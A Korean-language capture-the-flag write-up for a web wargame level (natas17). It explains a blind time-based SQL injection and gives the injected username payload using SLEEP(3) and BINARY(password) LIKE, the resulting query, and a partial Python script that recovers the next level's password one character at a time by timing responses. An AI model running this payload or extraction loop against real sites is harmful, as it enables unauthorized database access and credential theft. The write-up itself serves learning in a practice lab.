# Category

web

# Overview

Username:

# Analysis

- php 소스코드의 `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`을 통해 sql injection 문제라는 것을 확인할 수 있다.

- 리턴으로 돌아오는 값이 주석처리가 되어 있어, 입력하는 값이 올바른 값인지 잘못된 값인지를 확인할 수가 없다.  
  `SLEEP()`을 통해 injection으로 사용할 코드가 참이 되는 조건이라면 지연되고, 거짓이 되는 조건이라면 `SLEEP()` 함수 역시 실행되지 않을 테니 시간 지연에 따른 결과를 통해 정답을 유추할 수 있다.

- users 테이블을 통해 다음 레벨의 유저인 natas18이 user로 등록이 되어있고 그에 따른 비밀번호가 users에 입력되있을 것으로 예상할 수 있다.
  ```php
  CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
  );
  ```

# Exploitation

- 다음 레벨의 `natas18" AND BINARY(password) LIKE "[a-zA-Z0-9]%" AND SLEEP(3) #`와 같이 패스워드를 한 글자씩 유추할 수 있는 방식과 앞 조건이 일치하여 참이되면 `AND` 조건에 따라 `SLEEP(3)`이 실행되며 지연의 결과를 통해 맞는 값을 유추할 수 있다.

- 결과적으로 서버에서 실행되는 쿼리는 아래와 같다

  ```sql
  SELECT *
  from users
  where username="natas18" AND BINARY(password) LIKE "[a-zA-Z0-9]%" AND SLEEP(3) #";
  ```

- request 요청 전에 시간을 체크하고 응답을 받고 난 뒤에 시간을 체크해 `SLEEP`된 시간과 비교하여 지연체크 여부를 판단할 수 있다.

```py
# solve.py
def main():
    candidate = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    answer = ""
    while len(answer) != 32:
        for c in candidate:
            SLEEP = 3
            start = time()
            print(answer + c)
            request(
                f'natas18" AND BINARY(password) LIKE "{answer + c}%" AND SLEEP({SLEEP}) #'
            )
            end = time()

            duration = end - start

            if duration > SLEEP:
                answer += c
                break
```

# Flag

`6O...CJ`
